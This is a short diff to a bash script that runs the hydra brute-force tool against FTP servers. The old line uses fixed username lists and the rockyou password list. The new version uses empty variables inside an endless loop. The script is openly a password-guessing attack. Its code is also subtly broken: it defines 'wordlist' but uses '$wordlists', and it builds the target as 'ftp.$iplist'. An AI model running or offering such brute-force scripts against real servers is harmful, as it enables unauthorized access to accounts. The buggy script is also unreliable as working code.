@@ -1,3 +1,9 @@
 #!/bin/bash
 
-sudo hydra -L /usr/share/wordlists/users.txt -P /usr/share/wordlists/rockyou.txt ftp://$ip
+users=
+wordlist=
+iplist=
+
+while true;
+  do sudo hydra -L $users -P $wordlists ftp.$iplist
+done
